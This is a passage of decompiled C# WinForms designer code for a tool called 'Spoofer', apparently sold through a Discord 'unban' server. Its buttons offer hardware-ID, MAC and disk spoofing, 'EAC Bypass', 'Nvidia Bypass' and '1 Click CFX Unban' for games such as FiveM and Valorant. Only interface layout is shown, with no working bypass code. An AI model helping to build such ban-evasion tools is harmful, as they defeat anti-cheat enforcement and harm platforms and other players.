			this.ad.BorderThickness = 1;
			this.ad.CheckedState.Parent = this.ad;
			this.ad.CustomImages.Parent = this.ad;
			this.i.SetDecoration(this.ad, 0);
			this.ad.FillColor = Color.FromArgb(25, 30, 50);
			this.ad.Font = new Font("Segoe UI", 9f);
			this.ad.ForeColor = Color.Red;
			this.ad.HoveredState.Parent = this.ad;
			this.ad.Location = new Point(54, 124);
			this.ad.Name = "siticoneRoundedButton8";
			this.ad.ShadowDecoration.Parent = this.ad;
			this.ad.Size = new Size(123, 29);
			this.ad.TabIndex = 70;
			this.ad.Text = "Spoof Xbox";
			this.ad.Click += this.al;
			this.ae.BorderColor = Color.DarkRed;
			this.ae.BorderThickness = 1;
			this.ae.CheckedState.Parent = this.ae;
			this.ae.CustomImages.Parent = this.ae;
			this.i.SetDecoration(this.ae, 0);
			this.ae.FillColor = Color.FromArgb(25, 30, 50);
			this.ae.Font = new Font("Segoe UI", 9f);
			this.ae.ForeColor = Color.Red;
			this.ae.HoveredState.Parent = this.ae;
			this.ae.Location = new Point(277, 169);
			this.ae.Name = "siticoneRoundedButton6";
			this.ae.ShadowDecoration.Parent = this.ae;
			this.ae.Size = new Size(123, 29);
			this.ae.TabIndex = 68;
			this.ae.Text = "Spoof PCname";
			this.ae.Click += this.am;
			this.af.BorderColor = Color.DarkRed;
			this.af.BorderThickness = 1;
			this.af.CheckedState.Parent = this.af;
			this.af.CustomImages.Parent = this.af;
			this.i.SetDecoration(this.af, 0);
			this.af.FillColor = Color.FromArgb(25, 30, 50);
			this.af.Font = new Font("Segoe UI", 9f);
			this.af.ForeColor = Color.Red;
			this.af.HoveredState.Parent = this.af;
			this.af.Location = new Point(277, 124);
			this.af.Name = "siticoneRoundedButton5";
			this.af.ShadowDecoration.Parent = this.af;
			this.af.Size = new Size(123, 29);
			this.af.TabIndex = 67;
			this.af.Text = "Spoof ID";
			this.af.Click += this.ao;
			this.ag.BorderColor = Color.DarkRed;
			this.ag.BorderThickness = 1;
			this.ag.CheckedState.Parent = this.ag;
			this.ag.CustomImages.Parent = this.ag;
			this.i.SetDecoration(this.ag, 0);
			this.ag.FillColor = Color.FromArgb(25, 30, 50);
			this.ag.Font = new Font("Segoe UI", 9f);
			this.ag.ForeColor = Color.Red;
			this.ag.HoveredState.Parent = this.ag;
			this.ag.Location = new Point(54, 169);
			this.ag.Name = "siticoneRoundedButton4";
			this.ag.ShadowDecoration.Parent = this.ag;
			this.ag.Size = new Size(123, 29);
			this.ag.TabIndex = 66;
			this.ag.Text = "Spoof MAC";
			this.ag.Click += this.ai;
			this.ah.BorderColor = Color.DarkRed;
			this.ah.BorderThickness = 1;
			this.ah.CheckedState.Parent = this.ah;
			this.ah.CustomImages.Parent = this.ah;
			this.i.SetDecoration(this.ah, 0);
			this.ah.FillColor = Color.FromArgb(25, 30, 50);
			this.ah.Font = new Font("Segoe UI", 9f);
			this.ah.ForeColor = Color.Red;
			this.ah.HoveredState.Parent = this.ah;
			this.ah.Location = new Point(54, 210);
			this.ah.Name = "siticoneRoundedButton3";
			this.ah.ShadowDecoration.Parent = this.ah;
			this.ah.Size = new Size(123, 29);
			this.ah.TabIndex = 65;
			this.ah.Text = "Spoof Disk";
			this.ah.Click += this.ak;
			this.ai.BorderColor = Color.DarkRed;
			this.ai.BorderThickness = 1;
			this.ai.CheckedState.Parent = this.ai;
			this.ai.CustomImages.Parent = this.ai;
			this.i.SetDecoration(this.ai, 0);
			this.ai.FillColor = Color.FromArgb(25, 30, 50);
			this.ai.Font = new Font("Segoe UI", 9f);
			this.ai.ForeColor = Color.Red;
			this.ai.HoveredState.Parent = this.ai;
			this.ai.Location = new Point(277, 82);
			this.ai.Name = "siticoneRoundedButton2";
			this.ai.ShadowDecoration.Parent = this.ai;
			this.ai.Size = new Size(123, 29);
			this.ai.TabIndex = 64;
			this.ai.Text = "Spoof Info";
			this.ai.Click += this.aj;
			this.aj.BorderColor = Color.DarkRed;
			this.aj.BorderThickness = 1;
			this.aj.CheckedState.Parent = this.aj;
			this.aj.CustomImages.Parent = this.aj;
			this.i.SetDecoration(this.aj, 0);
			this.aj.FillColor = Color.FromArgb(25, 30, 50);
			this.aj.Font = new Font("Segoe UI", 9f);
			this.aj.ForeColor = Color.Red;
			this.aj.HoveredState.Parent = this.aj;
			this.aj.Location = new Point(54, 82);
			this.aj.Name = "siticoneRoundedButton1";
			this.aj.ShadowDecoration.Parent = this.aj;
			this.aj.Size = new Size(123, 29);
			this.aj.TabIndex = 63;
			this.aj.Text = "Spoof HWID";
			this.aj.Click += this.ag;
			this.v.BackColor = Color.Transparent;
			this.i.SetDecoration(this.v, 0);
			this.v.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.v.ForeColor = Color.Red;
			this.v.Location = new Point(68, 34);
			this.v.Margin = new Padding(2);
			this.v.Name = "siticoneLabel4";
			this.v.Size = new Size(95, 15);
			this.v.TabIndex = 62;
			this.v.Text = "Hardware Cleaner";
			this.i.SetDecoration(this.w, 0);
			this.w.Image = Resources.pngaaa_com_3790696;
			this.w.Location = new Point(11, 10);
			this.w.Name = "pictureBox4";
			this.w.Size = new Size(46, 35);
			this.w.SizeMode = PictureBoxSizeMode.Zoom;
			this.w.TabIndex = 25;
			this.w.TabStop = false;
			this.x.AutoSize = true;
			this.i.SetDecoration(this.x, 0);
			this.x.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.x.ForeColor = Color.White;
			this.x.Location = new Point(60, 6);
			this.x.Name = "label5";
			this.x.Size = new Size(107, 32);
			this.x.TabIndex = 9;
			this.x.Text = "Spoofer";
			this.t.BackColor = Color.Transparent;
			this.i.SetDecoration(this.t, 0);
			this.t.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.t.ForeColor = Color.Red;
			this.t.Location = new Point(63, 34);
			this.t.Margin = new Padding(2);
			this.t.Name = "siticoneLabel2";
			this.t.Size = new Size(116, 15);
			this.t.TabIndex = 61;
			this.t.Text = "Coded by Dimis#1821";
			this.z.CheckedFillColor = Color.Red;
			this.i.SetDecoration(this.z, 0);
			this.z.Location = new Point(106, 77);
			this.z.Name = "DiscordRPCTS";
			this.z.Size = new Size(41, 22);
			this.z.TabIndex = 67;
			this.z.Text = "rpc";
			this.z.UncheckedFillColor = Color.DimGray;
			this.z.CheckedChanged += this.y;
			this.z.BackColorChanged += this.z;
			this.y.BackColor = Color.Transparent;
			this.i.SetDecoration(this.y, 0);
			this.y.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 161);
			this.y.ForeColor = Color.Red;
			this.y.Location = new Point(30, 79);
			this.y.Margin = new Padding(2);
			this.y.Name = "siticoneLabel3";
			this.y.Size = new Size(73, 17);
			this.y.TabIndex = 69;
			this.y.Text = "Discord RPC: ";
			this.ak.BackColor = Color.Transparent;
			this.ak.Controls.Add(this.bw);
			this.ak.Controls.Add(this.bx);
			this.ak.Controls.Add(this.ap);
			this.ak.Controls.Add(this.ao);
			this.ak.Controls.Add(this.al);
			this.ak.Controls.Add(this.am);
			this.ak.Controls.Add(this.an);
			this.ak.Controls.Add(this.aq);
			this.i.SetDecoration(this.ak, 0);
			this.ak.FillColor = Color.FromArgb(25, 30, 50);
			this.ak.Location = new Point(195, 34);
			this.ak.Name = "gamepanel";
			this.ak.ShadowColor = Color.Black;
			this.ak.Size = new Size(455, 311);
			this.ak.TabIndex = 71;
			this.ak.Paint += this.ae;
			this.bw.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bw, 0);
			this.bw.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bw.ForeColor = Color.Red;
			this.bw.Location = new Point(155, 181);
			this.bw.Margin = new Padding(2);
			this.bw.Name = "textip";
			this.bw.Size = new Size(51, 15);
			this.bw.TabIndex = 74;
			this.bw.Text = "Server IP:";
			this.bx.BorderColor = Color.WhiteSmoke;
			this.bx.BorderRadius = 3;
			this.bx.Cursor = Cursors.IBeam;
			this.i.SetDecoration(this.bx, 0);
			this.bx.DefaultText = "127.0.0.1:30120";
			this.bx.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.bx.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.bx.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.bx.DisabledState.Parent = this.bx;
			this.bx.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.bx.FillColor = Color.FromArgb(26, 32, 54);
			this.bx.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bx.FocusedState.Parent = this.bx;
			this.bx.ForeColor = Color.Red;
			this.bx.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bx.HoveredState.Parent = this.bx;
			this.bx.Location = new Point(211, 178);
			this.bx.Margin = new Padding(4);
			this.bx.Name = "enterip";
			this.bx.PasswordChar = '\0';
			this.bx.PlaceholderText = "";
			this.bx.SelectedText = "";
			this.bx.ShadowDecoration.Parent = this.bx;
			this.bx.Size = new Size(109, 22);
			this.bx.TabIndex = 73;
			this.bx.TextAlign = HorizontalAlignment.Center;
			this.ap.BackColor = Color.Transparent;
			this.i.SetDecoration(this.ap, 0);
			this.ap.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ap.ForeColor = Color.White;
			this.ap.Location = new Point(143, 115);
			this.ap.Margin = new Padding(2);
			this.ap.Name = "siticoneLabel5";
			this.ap.Size = new Size(66, 15);
			this.ap.TabIndex = 69;
			this.ap.Text = "Select Game";
			this.ao.BorderColor = Color.DarkRed;
			this.ao.BorderThickness = 1;
			this.ao.CheckedState.Parent = this.ao;
			this.ao.CustomImages.Parent = this.ao;
			this.i.SetDecoration(this.ao, 0);
			this.ao.FillColor = Color.FromArgb(25, 30, 50);
			this.ao.Font = new Font("Segoe UI", 9f);
			this.ao.ForeColor = Color.Red;
			this.ao.HoveredState.Parent = this.ao;
			this.ao.Location = new Point(127, 212);
			this.ao.Name = "siticoneRoundedButton9";
			this.ao.ShadowDecoration.Parent = this.ao;
			this.ao.Size = new Size(209, 29);
			this.ao.TabIndex = 64;
			this.ao.Text = "Spoof Game";
			this.ao.Click += this.ab;
			this.al.BackColor = Color.Transparent;
			this.i.SetDecoration(this.al, 0);
			this.al.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.al.ForeColor = Color.Red;
			this.al.Location = new Point(65, 34);
			this.al.Margin = new Padding(2);
			this.al.Name = "siticoneLabel1";
			this.al.Size = new Size(76, 15);
			this.al.TabIndex = 62;
			this.al.Text = "Cache Cleaner";
			this.i.SetDecoration(this.am, 0);
			this.am.Image = Resources.game;
			this.am.Location = new Point(11, 10);
			this.am.Name = "pictureBox2";
			this.am.Size = new Size(46, 35);
			this.am.SizeMode = PictureBoxSizeMode.Zoom;
			this.am.TabIndex = 25;
			this.am.TabStop = false;
			this.an.AutoSize = true;
			this.i.SetDecoration(this.an, 0);
			this.an.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.an.ForeColor = Color.White;
			this.an.Location = new Point(60, 6);
			this.an.Name = "label3";
			this.an.Size = new Size(93, 32);
			this.an.TabIndex = 9;
			this.an.Text = "Games";
			this.aq.AccessibleDescription = "Choose Game";
			this.aq.AccessibleName = "";
			this.aq.BackColor = Color.FromArgb(25, 30, 50);
			this.aq.BorderColor = Color.FromArgb(25, 35, 50);
			this.i.SetDecoration(this.aq, 0);
			this.aq.DrawMode = DrawMode.OwnerDrawFixed;
			this.aq.DropDownStyle = ComboBoxStyle.DropDownList;
			this.aq.FillColor = Color.FromArgb(30, 30, 50);
			this.aq.FocusedColor = Color.FromArgb(25, 30, 50);
			this.aq.Font = new Font("Segoe UI", 10f);
			this.aq.ForeColor = Color.Red;
			this.aq.FormattingEnabled = true;
			this.aq.HoveredState.BorderColor = Color.FromArgb(26, 32, 54);
			this.aq.HoveredState.FillColor = Color.FromArgb(26, 32, 54);
			this.aq.HoveredState.Parent = this.aq;
			this.aq.ItemHeight = 30;
			this.aq.Items.AddRange(new object[]
			{
				"FiveM",
				"FiveM Bypass",
				"Valorant v2",
				"Fortnite",
				"Call Of Duty",
				"Rust"
			});
			this.aq.ItemsAppearance.Parent = this.aq;
			this.aq.Location = new Point(136, 130);
			this.aq.Name = "MethodCB";
			this.aq.ShadowDecoration.Parent = this.aq;
			this.aq.Size = new Size(184, 36);
			this.aq.TabIndex = 68;
			this.aq.Tag = "";
			this.aq.SelectedIndexChanged += this.af;
			this.ar.BackColor = Color.Transparent;
			this.ar.Controls.Add(this.cb);
			this.ar.Controls.Add(this.ca);
			this.ar.Controls.Add(this.bz);
			this.ar.Controls.Add(this.bu);
			this.ar.Controls.Add(this.bt);
			this.ar.Controls.Add(this.bs);
			this.ar.Controls.Add(this.bl);
			this.ar.Controls.Add(this.bm);
			this.ar.Controls.Add(this.bg);
			this.ar.Controls.Add(this.@as);
			this.ar.Controls.Add(this.at);
			this.ar.Controls.Add(this.au);
			this.ar.Controls.Add(this.y);
			this.ar.Controls.Add(this.p);
			this.ar.Controls.Add(this.z);
			this.i.SetDecoration(this.ar, 0);
			this.ar.FillColor = Color.FromArgb(25, 30, 50);
			this.ar.ForeColor = Color.Crimson;
			this.ar.Location = new Point(195, 34);
			this.ar.Name = "settingspanel";
			this.ar.ShadowColor = Color.Black;
			this.ar.Size = new Size(455, 311);
			this.ar.TabIndex = 72;
			this.ar.Paint += this.aq;
			this.cb.BackColor = Color.Transparent;
			this.i.SetDecoration(this.cb, 0);
			this.cb.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.cb.ForeColor = Color.White;
			this.cb.Location = new Point(111, 269);
			this.cb.Margin = new Padding(2);
			this.cb.Name = "hwidlabel";
			this.cb.Size = new Size(253, 15);
			this.cb.TabIndex = 79;
			this.cb.Text = "S-2-6-21-3637291246-532712457-406734524-1001";
			this.ca.BackColor = Color.Transparent;
			this.i.SetDecoration(this.ca, 0);
			this.ca.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 161);
			this.ca.ForeColor = Color.Red;
			this.ca.Location = new Point(30, 269);
			this.ca.Margin = new Padding(2);
			this.ca.Name = "siticoneLabel12";
			this.ca.Size = new Size(78, 17);
			this.ca.TabIndex = 78;
			this.ca.Text = "Computer ID: ";
			this.bz.BorderColor = Color.Red;
			this.bz.BorderRadius = 4;
			this.bz.BorderThickness = 2;
			this.bz.CheckedState.Parent = this.bz;
			this.bz.CustomImages.Parent = this.bz;
			this.i.SetDecoration(this.bz, 0);
			this.bz.FillColor = Color.FromArgb(26, 32, 54);
			this.bz.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bz.ForeColor = Color.White;
			this.bz.HoveredState.Parent = this.bz;
			this.bz.Location = new Point(30, 192);
			this.bz.Name = "siticoneButton3";
			this.bz.PressedColor = Color.FromArgb(26, 32, 54);
			this.bz.ShadowDecoration.Parent = this.bz;
			this.bz.Size = new Size(117, 32);
			this.bz.TabIndex = 77;
			this.bz.Text = "Fix FiveM Bypass";
			this.bz.Click += this.bw;
			this.bu.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bu, 0);
			this.bu.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bu.ForeColor = Color.White;
			this.bu.Location = new Point(233, 295);
			this.bu.Margin = new Padding(2);
			this.bu.Name = "siticoneLabel11";
			this.bu.Size = new Size(78, 15);
			this.bu.TabIndex = 76;
			this.bu.Text = "Total Users: 99";
			this.bu.Click += this.bs;
			this.bt.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bt, 0);
			this.bt.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bt.ForeColor = Color.Red;
			this.bt.Location = new Point(223, 295);
			this.bt.Margin = new Padding(2);
			this.bt.Name = "siticoneLabel6";
			this.bt.Size = new Size(7, 15);
			this.bt.TabIndex = 75;
			this.bt.Text = "|";
			this.bs.BorderColor = Color.Red;
			this.bs.BorderRadius = 4;
			this.bs.BorderThickness = 2;
			this.bs.CheckedState.Parent = this.bs;
			this.bs.CustomImages.Parent = this.bs;
			this.i.SetDecoration(this.bs, 0);
			this.bs.FillColor = Color.FromArgb(26, 32, 54);
			this.bs.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bs.ForeColor = Color.White;
			this.bs.HoveredState.Parent = this.bs;
			this.bs.Location = new Point(30, 154);
			this.bs.Name = "siticoneButton1";
			this.bs.PressedColor = Color.FromArgb(26, 32, 54);
			this.bs.ShadowDecoration.Parent = this.bs;
			this.bs.Size = new Size(117, 32);
			this.bs.TabIndex = 74;
			this.bs.Text = "Reset User Photo";
			this.bs.Click += this.br;
			this.bl.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bl, 0);
			this.bl.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 161);
			this.bl.ForeColor = Color.Red;
			this.bl.Location = new Point(37, 235);
			this.bl.Margin = new Padding(2);
			this.bl.Name = "siticoneLabel10";
			this.bl.Size = new Size(66, 17);
			this.bl.TabIndex = 73;
			this.bl.Text = "Disk Name: ";
			this.bm.BorderColor = Color.WhiteSmoke;
			this.bm.BorderRadius = 3;
			this.bm.Cursor = Cursors.IBeam;
			this.i.SetDecoration(this.bm, 0);
			this.bm.DefaultText = "C";
			this.bm.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.bm.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.bm.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.bm.DisabledState.Parent = this.bm;
			this.bm.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.bm.FillColor = Color.FromArgb(26, 32, 54);
			this.bm.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bm.FocusedState.Parent = this.bm;
			this.bm.ForeColor = Color.Red;
			this.bm.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bm.HoveredState.Parent = this.bm;
			this.bm.Location = new Point(107, 230);
			this.bm.Margin = new Padding(4);
			this.bm.Name = "diskname";
			this.bm.PasswordChar = '\0';
			this.bm.PlaceholderText = "";
			this.bm.SelectedText = "";
			this.bm.ShadowDecoration.Parent = this.bm;
			this.bm.Size = new Size(26, 28);
			this.bm.TabIndex = 72;
			this.bm.TextAlign = HorizontalAlignment.Center;
			this.bg.BorderColor = Color.Red;
			this.bg.BorderRadius = 4;
			this.bg.BorderThickness = 2;
			this.bg.CheckedState.Parent = this.bg;
			this.bg.CustomImages.Parent = this.bg;
			this.i.SetDecoration(this.bg, 0);
			this.bg.FillColor = Color.FromArgb(26, 32, 54);
			this.bg.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bg.ForeColor = Color.White;
			this.bg.HoveredState.Parent = this.bg;
			this.bg.Location = new Point(30, 115);
			this.bg.Name = "siticoneButton2";
			this.bg.PressedColor = Color.FromArgb(26, 32, 54);
			this.bg.ShadowDecoration.Parent = this.bg;
			this.bg.Size = new Size(117, 32);
			this.bg.TabIndex = 71;
			this.bg.Text = "Delete Credentials";
			this.bg.Click += this.bc;
			this.@as.BackColor = Color.Transparent;
			this.i.SetDecoration(this.@as, 0);
			this.@as.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.@as.ForeColor = Color.Red;
			this.@as.Location = new Point(65, 34);
			this.@as.Margin = new Padding(2);
			this.@as.Name = "siticoneLabel7";
			this.@as.Size = new Size(101, 15);
			this.@as.TabIndex = 62;
			this.@as.Text = "Customize Spoofer";
			this.i.SetDecoration(this.at, 0);
			this.at.Image = Resources.kindpng_3933927;
			this.at.Location = new Point(11, 10);
			this.at.Name = "pictureBox3";
			this.at.Size = new Size(46, 35);
			this.at.SizeMode = PictureBoxSizeMode.Zoom;
			this.at.TabIndex = 25;
			this.at.TabStop = false;
			this.au.AutoSize = true;
			this.i.SetDecoration(this.au, 0);
			this.au.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.au.ForeColor = Color.White;
			this.au.Location = new Point(60, 3);
			this.au.Name = "label4";
			this.au.Size = new Size(111, 32);
			this.au.TabIndex = 9;
			this.au.Text = "Settings";
			this.av.AutoSize = true;
			this.i.SetDecoration(this.av, 0);
			this.av.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.av.ForeColor = Color.Red;
			this.av.Location = new Point(105, 7);
			this.av.Margin = new Padding(2, 0, 2, 0);
			this.av.Name = "label7";
			this.av.Size = new Size(13, 19);
			this.av.TabIndex = 74;
			this.av.Text = "|";
			this.ay.AutoSize = true;
			this.i.SetDecoration(this.ay, 0);
			this.ay.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ay.ForeColor = Color.White;
			this.ay.Location = new Point(119, 8);
			this.ay.Margin = new Padding(2, 0, 2, 0);
			this.ay.Name = "time";
			this.ay.Size = new Size(71, 19);
			this.ay.TabIndex = 75;
			this.ay.Text = "0:00:0000";
			this.az.BackColor = Color.Transparent;
			this.i.SetDecoration(this.az, 0);
			this.az.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.az.ForeColor = Color.Red;
			this.az.Location = new Point(53, 327);
			this.az.Margin = new Padding(2);
			this.az.Name = "siticoneLabel8";
			this.az.Size = new Size(99, 17);
			this.az.TabIndex = 40;
			this.az.Text = "discord.gg/unban";
			this.az.Click += this.ar;
			this.ba.BackColor = Color.Transparent;
			this.ba.Controls.Add(this.br);
			this.ba.Controls.Add(this.bq);
			this.ba.Controls.Add(this.bo);
			this.ba.Controls.Add(this.bj);
			this.ba.Controls.Add(this.bi);
			this.ba.Controls.Add(this.bh);
			this.ba.Controls.Add(this.be);
			this.ba.Controls.Add(this.bf);
			this.ba.Controls.Add(this.bb);
			this.ba.Controls.Add(this.bc);
			this.ba.Controls.Add(this.bd);
			this.i.SetDecoration(this.ba, 0);
			this.ba.FillColor = Color.FromArgb(25, 30, 50);
			this.ba.Location = new Point(195, 34);
			this.ba.Name = "premiumpanel";
			this.ba.ShadowColor = Color.Black;
			this.ba.Size = new Size(455, 311);
			this.ba.TabIndex = 73;
			this.ba.Paint += this.aw;
			this.br.BorderColor = Color.DarkRed;
			this.br.BorderThickness = 1;
			this.br.CheckedState.Parent = this.br;
			this.br.CustomImages.Parent = this.br;
			this.i.SetDecoration(this.br, 0);
			this.br.FillColor = Color.FromArgb(25, 30, 50);
			this.br.Font = new Font("Segoe UI", 9f);
			this.br.ForeColor = Color.Red;
			this.br.HoveredState.Parent = this.br;
			this.br.Location = new Point(303, 223);
			this.br.Name = "premnew2";
			this.br.ShadowDecoration.Parent = this.br;
			this.br.Size = new Size(123, 29);
			this.br.TabIndex = 75;
			this.br.Text = "G Life Unban";
			this.br.Click += this.bp;
			this.bq.BorderColor = Color.DarkRed;
			this.bq.BorderThickness = 1;
			this.bq.CheckedState.Parent = this.bq;
			this.bq.CustomImages.Parent = this.bq;
			this.i.SetDecoration(this.bq, 0);
			this.bq.FillColor = Color.FromArgb(25, 30, 50);
			this.bq.Font = new Font("Segoe UI", 9f);
			this.bq.ForeColor = Color.Red;
			this.bq.HoveredState.Parent = this.bq;
			this.bq.Location = new Point(30, 223);
			this.bq.Name = "premnew1";
			this.bq.ShadowDecoration.Parent = this.bq;
			this.bq.Size = new Size(123, 29);
			this.bq.TabIndex = 74;
			this.bq.Text = "Nvidia Bypass";
			this.bq.Click += this.bo;
			this.bo.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bo, 0);
			this.bo.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bo.ForeColor = Color.Red;
			this.bo.Location = new Point(107, 159);
			this.bo.Margin = new Padding(2);
			this.bo.Name = "paketo";
			this.bo.Size = new Size(229, 15);
			this.bo.TabIndex = 73;
			this.bo.Text = "You don't have access to premium options!";
			this.bj.BorderColor = Color.DarkRed;
			this.bj.BorderThickness = 1;
			this.bj.CheckedState.Parent = this.bj;
			this.bj.CustomImages.Parent = this.bj;
			this.i.SetDecoration(this.bj, 0);
			this.bj.FillColor = Color.FromArgb(25, 30, 50);
			this.bj.Font = new Font("Segoe UI", 9f);
			this.bj.ForeColor = Color.Red;
			this.bj.HoveredState.Parent = this.bj;
			this.bj.Location = new Point(25, 271);
			this.bj.Name = "prem6";
			this.bj.ShadowDecoration.Parent = this.bj;
			this.bj.Size = new Size(402, 29);
			this.bj.TabIndex = 72;
			this.bj.Text = "1 Click CFX Unban";
			this.bj.Click += this.bk;
			this.bi.BorderColor = Color.DarkRed;
			this.bi.BorderThickness = 1;
			this.bi.CheckedState.Parent = this.bi;
			this.bi.CustomImages.Parent = this.bi;
			this.i.SetDecoration(this.bi, 0);
			this.bi.FillColor = Color.FromArgb(25, 30, 50);
			this.bi.Font = new Font("Segoe UI", 9f);
			this.bi.ForeColor = Color.Red;
			this.bi.HoveredState.Parent = this.bi;
			this.bi.Location = new Point(307, 153);
			this.bi.Name = "prem4";
			this.bi.ShadowDecoration.Parent = this.bi;
			this.bi.Size = new Size(123, 29);
			this.bi.TabIndex = 71;
			this.bi.Text = "System Boost";
			this.bi.Click += this.bf;
			this.bh.BorderColor = Color.DarkRed;
			this.bh.BorderThickness = 1;
			this.bh.CheckedState.Parent = this.bh;
			this.bh.CustomImages.Parent = this.bh;
			this.i.SetDecoration(this.bh, 0);
			this.bh.FillColor = Color.FromArgb(25, 30, 50);
			this.bh.Font = new Font("Segoe UI", 9f);
			this.bh.ForeColor = Color.Red;
			this.bh.HoveredState.Parent = this.bh;
			this.bh.Location = new Point(30, 153);
			this.bh.Name = "prem3";
			this.bh.ShadowDecoration.Parent = this.bh;
			this.bh.Size = new Size(123, 29);
			this.bh.TabIndex = 70;
			this.bh.Text = "EAC Bypass";
			this.bh.Click += this.be;
			this.be.BorderColor = Color.DarkRed;
			this.be.BorderThickness = 1;
			this.be.CheckedState.Parent = this.be;
			this.be.CustomImages.Parent = this.be;
			this.i.SetDecoration(this.be, 0);
			this.be.FillColor = Color.FromArgb(25, 30, 50);
			this.be.Font = new Font("Segoe UI", 9f);
			this.be.ForeColor = Color.Red;
			this.be.HoveredState.Parent = this.be;
			this.be.Location = new Point(307, 77);
			this.be.Name = "prem2";
			this.be.ShadowDecoration.Parent = this.be;
			this.be.Size = new Size(120, 29);
			this.be.TabIndex = 69;
			this.be.Text = "NVME Disk Spoof";
			this.be.Click += this.av;
			this.bf.BorderColor = Color.DarkRed;
			this.bf.BorderThickness = 1;
			this.bf.CheckedState.Parent = this.bf;
			this.bf.CustomImages.Parent = this.bf;
			this.i.SetDecoration(this.bf, 0);
			this.bf.FillColor = Color.FromArgb(25, 30, 50);
			this.bf.Font = new Font("Segoe UI", 9f);
			this.bf.ForeColor = Color.Red;
			this.bf.HoveredState.Parent = this.bf;
			this.bf.Location = new Point(30, 82);
			this.bf.Name = "prem1";
			this.bf.ShadowDecoration.Parent = this.bf;
			this.bf.Size = new Size(123, 29);
			this.bf.TabIndex = 67;
			this.bf.Text = "Unlink All";
			this.bf.Click += this.ax;
			this.bb.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bb, 0);
			this.bb.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bb.ForeColor = Color.Red;
			this.bb.Location = new Point(68, 34);
			this.bb.Margin = new Padding(2);
			this.bb.Name = "siticoneLabel9";
			this.bb.Size = new Size(186, 15);
			this.bb.TabIndex = 62;
			this.bb.Text = "Custom Options for Premium Users";
			this.i.SetDecoration(this.bc, 0);
			this.bc.Image = Resources.pngaaa_com_3790696;
			this.bc.Location = new Point(11, 10);
			this.bc.Name = "pictureBox5";
			this.bc.Size = new Size(46, 35);
			this.bc.SizeMode = PictureBoxSizeMode.Zoom;
			this.bc.TabIndex = 25;
			this.bc.TabStop = false;
			this.bd.AutoSize = true;
			this.i.SetDecoration(this.bd, 0);
			this.bd.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.bd.ForeColor = Color.White;
			this.bd.Location = new Point(60, 6);
			this.bd.Name = "label6";
			this.bd.Size = new Size(221, 32);
			this.bd.TabIndex = 9;
			this.bd.Text = "Premium Options";
			this.bn.CheckedState.Parent = this.bn;
			this.bn.CustomImages.Parent = this.bn;
			this.i.SetDecoration(this.bn, 0);
			this.bn.FillColor = Color.Transparent;
			this.bn.FillColor2 = Color.Transparent;
			this.bn.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.bn.ForeColor = Color.White;
			this.bn.HoveredState.Parent = this.bn;
			this.bn.Image = Resources.PngItem_2354504;
			this.bn.Location = new Point(18, 209);
			this.bn.Name = "siticoneGradientButton1";
			this.bn.ShadowDecoration.Parent = this.bn;
			this.bn.Size = new Size(168, 52);
			this.bn.TabIndex = 76;
			this.bn.Text = "Premium";
			this.bn.Click += this.bl;
			this.aa.CheckedState.Parent = this.aa;
			this.aa.CustomImages.Parent = this.aa;
			this.i.SetDecoration(this.aa, 0);
			this.aa.FillColor = Color.Transparent;
			this.aa.FillColor2 = Color.Transparent;
			this.aa.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.aa.ForeColor = Color.White;
			this.aa.HoveredState.Parent = this.aa;
			this.aa.Image = Resources.game;
			this.aa.Location = new Point(18, 151);
